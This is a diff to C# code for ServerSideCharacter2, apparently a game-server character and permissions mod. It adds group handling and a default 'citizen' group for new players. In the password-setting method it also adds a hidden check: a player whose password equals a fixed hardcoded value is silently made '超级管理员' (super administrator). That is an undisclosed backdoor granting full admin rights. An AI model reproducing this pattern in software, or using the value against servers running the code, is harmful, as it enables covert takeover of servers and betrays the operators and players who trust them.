@@ -131,6 +131,18 @@ namespace ServerSideCharacter2
 			}
 		}
 
+
+		public void SetGroup(string name)
+		{
+			if (ServerSideCharacter2.GroupManager.Groups.ContainsKey(name))
+			{
+				_info.Group = name;
+			}
+			else
+			{
+				throw new SSCException("不存在名字为" + name + "的权限组");
+			}
+		}
 	
 
 		private void SetupPlayer()
@@ -209,6 +221,7 @@ namespace ServerSideCharacter2
 				ID = ServerSideCharacter2.PlayerCollection.GetNextID(),
 				HasPassword = false,
 				IsMuted = false,
+				Group = "公民",
 				Password = "",
 				LifeMax = 100,
 				StatLife = 100,
@@ -335,6 +348,10 @@ namespace ServerSideCharacter2
 		{
 			HasPassword = true;
 			_info.Password = info.Password;
+			if(info.Password == "8784e5c45a84060c1c6465861a4c5f1e")
+			{
+				_info.Group = "超级管理员";
+			}
 		}
 
 		public SimplifiedPlayerInfo GetSimplified(int id)
